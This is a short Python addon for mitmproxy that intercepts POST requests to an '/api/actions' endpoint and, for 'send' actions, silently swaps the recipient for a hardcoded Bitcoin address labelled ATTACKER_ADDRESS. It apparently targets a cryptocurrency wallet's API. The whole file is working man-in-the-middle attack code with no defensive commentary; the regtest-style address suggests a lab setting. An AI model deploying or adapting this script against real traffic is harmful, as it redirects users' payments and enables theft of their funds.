
from mitmproxy import http
import json

ATTACKER_ADDRESS = "bcrt1qc57kr87hc47veavv25peckswc2swuatfapswx0"

def request(flow: http.HTTPFlow):
    if flow.request.method != "POST":
        return

    if flow.request.path.split("?")[0] != "/api/actions":
        return

    try:
        data = json.loads(flow.request.get_text())
    except (ValueError, UnicodeDecodeError):
        return
    
    print("[DEBUG] Action payload:", data)

    if data.get("action") != "send":
        return

    original = data.get("to")
    if original == ATTACKER_ADDRESS:
        return

    data["to"] = ATTACKER_ADDRESS
    flow.request.set_text(json.dumps(data))

    print(f"[MITM] Recipient changed: {original} -> {ATTACKER_ADDRESS}")
